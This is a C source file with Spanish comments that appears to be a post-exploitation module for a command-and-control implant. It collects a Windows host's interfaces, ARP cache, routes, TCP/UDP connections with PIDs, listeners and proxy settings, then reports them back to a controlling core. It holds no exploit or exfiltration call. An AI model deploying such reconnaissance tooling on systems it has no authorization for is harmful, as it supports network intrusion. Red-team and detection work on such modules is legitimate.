/**
Info red
113 - 0x71
1. Interfaces (IPs, mascaras, MAC, DNS, gateway, flags)
2. ARP cache
3. Tabla de rutas
4. Conexiones TCP/UDP (ips+puertos) con PID
5. Puertos abiertos (listeners)
6. Proxy del registro

Avanzado:
Firewall local: debido a la api es dificil implementar con coff
 */

/* _WIN32_WINNT >= 0x0600 (Vista) obliga a iptypes.h a usar la variante
 * IP_ADAPTER_ADDRESSES_LH, que incluye OperStatus y FirstGatewayAddress.
 * Si no se define, iptypes.h usa la variante XP (mas pobre, sin gateway ni estado). */
#define WINVER 0x0601
#define _WIN32_WINNT 0x0601

#include <stdint.h>
#include "api_table.h"
#include "module_helpers.h"
#include "parser.h"

/* ── Helpers ── */
static const char* tcp_state_str(DWORD state) {
    switch (state) {
        case MIB_TCP_STATE_CLOSED:     return "CLOSED";
        case MIB_TCP_STATE_LISTEN:     return "LISTEN";
        case MIB_TCP_STATE_SYN_SENT:   return "SYN_SENT";
        case MIB_TCP_STATE_SYN_RCVD:   return "SYN_RCVD";
        case MIB_TCP_STATE_ESTAB:      return "ESTABLISHED";
        case MIB_TCP_STATE_FIN_WAIT1:  return "FIN_WAIT1";
        case MIB_TCP_STATE_FIN_WAIT2:  return "FIN_WAIT2";
        case MIB_TCP_STATE_CLOSE_WAIT: return "CLOSE_WAIT";
        case MIB_TCP_STATE_CLOSING:    return "CLOSING";
        case MIB_TCP_STATE_LAST_ACK:   return "LAST_ACK";
        case MIB_TCP_STATE_TIME_WAIT:  return "TIME_WAIT";
        case MIB_TCP_STATE_DELETE_TCB: return "DELETE_TCB";
        default:                       return "UNKNOWN";
    }
}

void go(ApiTable* api, const char* task_uuid, Param* params, uint32_t param_count) {
    (void)params;
    (void)param_count;

    /* Buffer de salida */
    char* out = (char*)api->malloc(OUT_BUF_SIZE);
    size_t used = 0;
    if (!out) return;

    char err_str[12];

    /* Interfaces */
    buf_append_str(out, &used, "[Interfaces]:\n");

    /* GAA_FLAG_INCLUDE_PREFIX: incluir prefijos (mascaras)
     * GAA_FLAG_INCLUDE_GATEWAYS: incluir gateways.(por eso _WIN32_WINNT >= 0x0600 arriba). */
    ULONG flags = GAA_FLAG_INCLUDE_PREFIX | GAA_FLAG_INCLUDE_GATEWAYS;

    ULONG size = 0;
    ULONG ret = api->GetAdaptersAddresses(AF_UNSPEC, flags, NULL, NULL, &size);
    if (ret != ERROR_BUFFER_OVERFLOW || size == 0) {
        buf_append_str(out, &used, "[!][NET]: [ERROR] GetAdaptersAddresses (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    PIP_ADAPTER_ADDRESSES adapters = (PIP_ADAPTER_ADDRESSES)api->malloc(size);
    if (!adapters) {
        buf_append_str(out, &used, "[!][NET]: [ERROR] OUT OF MEMORY\n");
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    ret = api->GetAdaptersAddresses(AF_UNSPEC, flags, NULL, adapters, &size);
    if (ret != NO_ERROR) {
        buf_append_str(out, &used, "[!][NET]: [ERROR] GetAdaptersAddresses (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
        api->free(adapters);
        api->report_result(task_uuid, (const uint8_t*)out, used, 0x99);
        api->free(out);
        return;
    }

    for (PIP_ADAPTER_ADDRESSES a = adapters; a != NULL; a = a->Next) {

        /* Name */
        char name_utf8[260];
        if (a->FriendlyName) {
            api->WideCharToMultiByte(CP_UTF8, 0, a->FriendlyName, -1,
                                     name_utf8, sizeof(name_utf8), NULL, NULL);
        } else if (a->Description) {
            api->WideCharToMultiByte(CP_UTF8, 0, a->Description, -1,
                                     name_utf8, sizeof(name_utf8), NULL, NULL);
        } else {
            api->sprintf(name_utf8, "(Unknown)");
        }

        /* Status */
        const char* state = (a->OperStatus == IfOperStatusUp) ? "ACTIVE" :
        (a->OperStatus == IfOperStatusLowerLayerDown) ?  "[!] VPN/VM": "DOWN";

        /* MAC */
        char mac[32];
        if (a->PhysicalAddressLength > 0) {
            int off = 0;
            for (DWORD i = 0; i < a->PhysicalAddressLength; i++)
                off += api->sprintf(mac + off, i == 0 ? "%02x" : ":%02x", (unsigned)a->PhysicalAddress[i]);
        } else {
            api->sprintf(mac, "N/A");
        }

        buf_append_str(out, &used, "[>] ");
        buf_append_str(out, &used, name_utf8);
        buf_append_str(out, &used, " [MAC] ");
        buf_append_str(out, &used, mac);
        buf_append_str(out, &used, " [STATE] ");
        buf_append_str(out, &used, state);
        buf_append_str(out, &used, "\n");

        /* IPs */
        for (PIP_ADAPTER_UNICAST_ADDRESS ua = a->FirstUnicastAddress; ua != NULL; ua = ua->Next) {
            char ip[64];
            sockaddr_to_str(api, ua->Address.lpSockaddr, ip, sizeof(ip));
            buf_append_str(out, &used, "\t[IP] ");
            buf_append_str(out, &used, ip);
            buf_append_str(out, &used, "/");
            char plen[8];
            u64_to_dec((uint64_t)ua->OnLinkPrefixLength, plen);
            buf_append_str(out, &used, plen);
            buf_append_str(out, &used, "\n");
        }

        /* Gateway */
        for (PIP_ADAPTER_GATEWAY_ADDRESS gw_addr = a->FirstGatewayAddress;
             gw_addr != NULL; gw_addr = gw_addr->Next) {
            char gw[64];
            sockaddr_to_str(api, gw_addr->Address.lpSockaddr, gw, sizeof(gw));
            buf_append_str(out, &used, "\t[Gateway]  ");
            buf_append_str(out, &used, gw);
            buf_append_str(out, &used, "\n");
        }

        /* DNS */
        for (PIP_ADAPTER_DNS_SERVER_ADDRESS dns = a->FirstDnsServerAddress; dns != NULL; dns = dns->Next) {
            char dns_str[64];
            sockaddr_to_str(api, dns->Address.lpSockaddr, dns_str, sizeof(dns_str));
            buf_append_str(out, &used, "\t[DNS SERVER] ");
            buf_append_str(out, &used, dns_str);
            buf_append_str(out, &used, "\n");
        }

        /* Flags */
        char net_flags[128];
        buf_append_str(out, &used, "\t[Flags]\n");
        api->sprintf(net_flags, "\t\tIPv4 Enabled: %s\n", a->Ipv4Enabled? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
        api->sprintf(net_flags, "\t\tIPv6 Enabled: %s\n", a->Ipv6Enabled? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
        api->sprintf(net_flags, "\t\tDHCPv4 Enabled: %s\n", a->Dhcpv4Enabled? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
        api->sprintf(net_flags, "\t\tIPv6 Managed Config: %s\n", a->Ipv6ManagedAddressConfigurationSupported? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
        api->sprintf(net_flags, "\t\tDNS Enabled: %s\n", a->DdnsEnabled? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
        api->sprintf(net_flags, "\t\tNetBIOS over TCP/IP: %s\n", a->NetbiosOverTcpipEnabled? "YES" : "NO");
        buf_append_str(out, &used, net_flags);
    }
    api->free(adapters);

    /* ARP cache */
    ULONG arp_size = 0;
    ULONG arp_ret = api->GetIpNetTable(NULL, &arp_size, TRUE);
    if (arp_ret == ERROR_INSUFFICIENT_BUFFER && arp_size > 0) {
        PMIB_IPNETTABLE nt = (PMIB_IPNETTABLE)api->malloc(arp_size);
        if (!nt) {
            buf_append_str(out, &used, "[!][NET]: [ERROR] OUT OF MEMORY\n");
        } else {
            arp_ret = api->GetIpNetTable(nt, &arp_size, TRUE);
            if (arp_ret != NO_ERROR) {
                buf_append_str(out, &used, "[!][NET]: [ERROR] GetIpNetTable (error ");
                u64_to_dec((uint64_t)arp_ret, err_str);
                buf_append_str(out, &used, err_str);
                buf_append_str(out, &used, ")\n");
            } else {
                char line[260];
                buf_append_str(out, &used, "[ARP CACHE]:\n");
                for (DWORD i = 0; i < nt->dwNumEntries; i++) {
                    /* IP remota (network byte order) */
                    char ip[16];
                    ip4_from_dword(api, nt->table[i].dwAddr, ip);

                    /* MAC */
                    char mac[32];
                    if (nt->table[i].dwPhysAddrLen > 0) {
                        int off = 0;
                        for (DWORD j = 0; j < nt->table[i].dwPhysAddrLen; j++)
                            off += api->sprintf(mac + off, j == 0 ? "%02x" : ":%02x",
                                                (unsigned)nt->table[i].bPhysAddr[j]);
                    } else {
                        api->sprintf(mac, "N/A");
                    }

                    /* Tipo */
                    const char* type;
                    switch (nt->table[i].dwType) {
                        case MIB_IPNET_TYPE_DYNAMIC: type = "Dynamic"; break;
                        case MIB_IPNET_TYPE_STATIC:  type = "Static";  break;
                        default:                     type = "Other";   break;
                    }

                    api->sprintf(line, "\t%s  [MAC] %s  [Type] %s\n", ip, mac, type);
                    buf_append_str(out, &used, line);
                }
            }
            api->free(nt);
        }
    } else {
        buf_append_str(out, &used, "[!][NET]: [ERROR] GetIpNetTable (sizing)\n");
    }

    /* Rutas */
    ULONG fw_size = 0;
    ULONG fw_ret = api->GetIpForwardTable(NULL, &fw_size, TRUE);
    if (fw_ret == ERROR_INSUFFICIENT_BUFFER && fw_size > 0) {
        PMIB_IPFORWARDTABLE ft = (PMIB_IPFORWARDTABLE)api->malloc(fw_size);
        if (!ft) {
            buf_append_str(out, &used, "[!][NET]: [ERROR] OUT OF MEMORY\n");
        } else {
            fw_ret = api->GetIpForwardTable(ft, &fw_size, TRUE);
            if (fw_ret != NO_ERROR) {
                buf_append_str(out, &used, "[!][NET]: [ERROR] GetIpForwardTable (error ");
                u64_to_dec((uint64_t)fw_ret, err_str);
                buf_append_str(out, &used, err_str);
                buf_append_str(out, &used, ")\n");
            } else {
                char line[260];
                buf_append_str(out, &used, "[FW TABLE]:\n");
                for (DWORD i = 0; i < ft->dwNumEntries; i++) {
                    MIB_IPFORWARDROW* r = &ft->table[i];

                    /* IPs en network byte order → a.b.c.d (no u64_to_dec) */
                    char dest[16], mask[16], hop[16], idx[12];
                    ip4_from_dword(api, r->dwForwardDest, dest);
                    ip4_from_dword(api, r->dwForwardMask, mask);
                    ip4_from_dword(api, r->dwForwardNextHop, hop);
                    u64_to_dec((uint64_t)r->dwForwardIfIndex, idx);

                    api->sprintf(line, "\tdest %s/%s  via %s  if[%s]\n",
                                 dest, mask, hop, idx);
                    buf_append_str(out, &used, line);
                }
            }
            api->free(ft);
        }
    } else {
        buf_append_str(out, &used, "[!][NET]: [ERROR] GetIpForwardTable (sizing)\n");
    }

    /* TCP Connections */
    DWORD tcp_size = 0;
    DWORD tcp_ret = api->GetExtendedTcpTable(NULL, &tcp_size, TRUE, AF_INET,
                                             TCP_TABLE_OWNER_PID_ALL, 0);
    PMIB_TCPTABLE_OWNER_PID tcp = NULL;
    if (tcp_ret == ERROR_INSUFFICIENT_BUFFER && tcp_size > 0) {
        tcp = (PMIB_TCPTABLE_OWNER_PID)api->malloc(tcp_size);
        if (tcp) {
            tcp_ret = api->GetExtendedTcpTable(tcp, &tcp_size, TRUE, AF_INET,
                                               TCP_TABLE_OWNER_PID_ALL, 0);
            if (tcp_ret != NO_ERROR) { api->free(tcp); tcp = NULL; }
        }
    }

    /* UDP Connections */
    DWORD udp_size = 0;
    DWORD udp_ret = api->GetExtendedUdpTable(NULL, &udp_size, TRUE, AF_INET,
                                             UDP_TABLE_OWNER_PID, 0);
    PMIB_UDPTABLE_OWNER_PID udp = NULL;
    if (udp_ret == ERROR_INSUFFICIENT_BUFFER && udp_size > 0) {
        udp = (PMIB_UDPTABLE_OWNER_PID)api->malloc(udp_size);
        if (udp) {
            udp_ret = api->GetExtendedUdpTable(udp, &udp_size, TRUE, AF_INET,
                                               UDP_TABLE_OWNER_PID, 0);
            if (udp_ret != NO_ERROR) { api->free(udp); udp = NULL; }
        }
    }

    /* --- TCP Complete --- */
    buf_append_str(out, &used, "[TCP CONNECTIONS]:\n");
    if (!tcp) {
        buf_append_str(out, &used, "\t[ERROR] GetExtendedTcpTable\n");
    } else {
        for (DWORD i = 0; i < tcp->dwNumEntries; i++) {
            MIB_TCPROW_OWNER_PID* r = &tcp->table[i];

            char local[64], remote[64], lport[8], rport[8], pid[12];
            ip4_from_dword(api, r->dwLocalAddr, local);
            port_from_dword(api, r->dwLocalPort, lport);
            ip4_from_dword(api, r->dwRemoteAddr, remote);
            port_from_dword(api, r->dwRemotePort, rport);
            u64_to_dec((uint64_t)r->dwOwningPid, pid);

            buf_append_str(out, &used, "\t[STATE] ");
            buf_append_str(out, &used, tcp_state_str(r->dwState));
            buf_append_str(out, &used, "\t[LOCAL] ");
            buf_append_str(out, &used, local);
            buf_append_str(out, &used, ":");
            buf_append_str(out, &used, lport);
            buf_append_str(out, &used, "\t[REMOTE] ");
            buf_append_str(out, &used, remote);
            buf_append_str(out, &used, ":");
            buf_append_str(out, &used, rport);
            buf_append_str(out, &used, "\t[PID] ");
            buf_append_str(out, &used, pid);
            buf_append_str(out, &used, "\n");
        }
    }

    /* --- UDP Complete --- */
    buf_append_str(out, &used, "[UDP CONNECTIONS]:\n");
    if (!udp) {
        buf_append_str(out, &used, "\t[ERROR] GetExtendedUdpTable\n");
    } else {
        for (DWORD i = 0; i < udp->dwNumEntries; i++) {
            MIB_UDPROW_OWNER_PID* r = &udp->table[i];

            char local[64], lport[8], pid[12];
            ip4_from_dword(api, r->dwLocalAddr, local);
            port_from_dword(api, r->dwLocalPort, lport);
            u64_to_dec((uint64_t)r->dwOwningPid, pid);

            buf_append_str(out, &used, "\t[LOCAL] ");
            buf_append_str(out, &used, local);
            buf_append_str(out, &used, ":");
            buf_append_str(out, &used, lport);
            buf_append_str(out, &used, "\t[PID] ");
            buf_append_str(out, &used, pid);
            buf_append_str(out, &used, "\n");
        }
    }

    /* --- Listeners --- */
    buf_append_str(out, &used, "[LISTENERS]:\n");
    if (tcp) {
        for (DWORD i = 0; i < tcp->dwNumEntries; i++) {
            MIB_TCPROW_OWNER_PID* r = &tcp->table[i];
            if (r->dwState != MIB_TCP_STATE_LISTEN) continue;

            char local[64], lport[8], pid[12];
            ip4_from_dword(api, r->dwLocalAddr, local);
            port_from_dword(api, r->dwLocalPort, lport);
            u64_to_dec((uint64_t)r->dwOwningPid, pid);

            buf_append_str(out, &used, "\t[TCP] ");
            buf_append_str(out, &used, local);
            buf_append_str(out, &used, ":");
            buf_append_str(out, &used, lport);
            buf_append_str(out, &used, "\t[PID] ");
            buf_append_str(out, &used, pid);
            buf_append_str(out, &used, "\n");
        }
    }
    if (udp) {
        for (DWORD i = 0; i < udp->dwNumEntries; i++) {
            MIB_UDPROW_OWNER_PID* r = &udp->table[i];

            char local[64], lport[8], pid[12];
            ip4_from_dword(api, r->dwLocalAddr, local);
            port_from_dword(api, r->dwLocalPort, lport);
            u64_to_dec((uint64_t)r->dwOwningPid, pid);

            buf_append_str(out, &used, "\t[UDP] ");
            buf_append_str(out, &used, local);
            buf_append_str(out, &used, ":");
            buf_append_str(out, &used, lport);
            buf_append_str(out, &used, "\t[PID] ");
            buf_append_str(out, &used, pid);
            buf_append_str(out, &used, "\n");
        }
    }

    if (tcp) api->free(tcp);
    if (udp) api->free(udp);

    /* Proxy */
    //6. Proxy — WinHttpGetIEProxyConfigForCurrentUser(&cfg)
    char proxy[260];
    WINHTTP_CURRENT_USER_IE_PROXY_CONFIG pc;
    if (api->WinHttpGetIEProxyConfigForCurrentUser(&pc)) {
        buf_append_str(out, &used, "[PROXY]:\n");
        api->sprintf(proxy, "\t[WPAD]: %s", pc.fAutoDetect? "YES":"NO");
        buf_append_str(out, &used, proxy);
        buf_append_str(out, &used, "\n");

        buf_append_str(out, &used, "\t[STATIC PROXY]: ");
        if (pc.lpszProxy==NULL) {
            buf_append_str(out, &used, "N/A\n");
        }else {
            api->WideCharToMultiByte(CP_UTF8, 0, pc.lpszProxy, -1,
                                     proxy, sizeof(proxy), NULL, NULL);
            buf_append_str(out, &used, proxy);
            buf_append_str(out, &used, "\n");
        }

        buf_append_str(out, &used, "\t[PAC File]: ");
        if (pc.lpszAutoConfigUrl==NULL) {
            buf_append_str(out, &used, "N/A\n");
        }else {
            api->WideCharToMultiByte(CP_UTF8, 0, pc.lpszAutoConfigUrl, -1,
                                     proxy, sizeof(proxy), NULL, NULL);
            buf_append_str(out, &used, proxy);
            buf_append_str(out, &used, "\n");
        }

        buf_append_str(out, &used, "\t[Exceptions]: ");
        if (pc.lpszProxyBypass==NULL) {
            buf_append_str(out, &used, "N/A\n");
        }else {
            api->WideCharToMultiByte(CP_UTF8, 0, pc.lpszProxyBypass, -1,
                                     proxy, sizeof(proxy), NULL, NULL);
            buf_append_str(out, &used, proxy);
            buf_append_str(out, &used, "\n");
        }

        if (pc.lpszAutoConfigUrl) api->GlobalFree(pc.lpszAutoConfigUrl);
        if (pc.lpszProxy) api->GlobalFree(pc.lpszProxy);
        if (pc.lpszProxyBypass) api->GlobalFree(pc.lpszProxyBypass);

    }else {
        buf_append_str(out, &used, "[!][NET]: [ERROR] WinHttpGetIEProxyConfigForCurrentUser (error ");
        u64_to_dec((uint64_t)api->GetLastError(), err_str);
        buf_append_str(out, &used, err_str);
        buf_append_str(out, &used, ")\n");
    }

    /* Reportar al core */
    api->report_result(task_uuid, (const uint8_t*)out, used, 0x95);
    api->free(out);
}
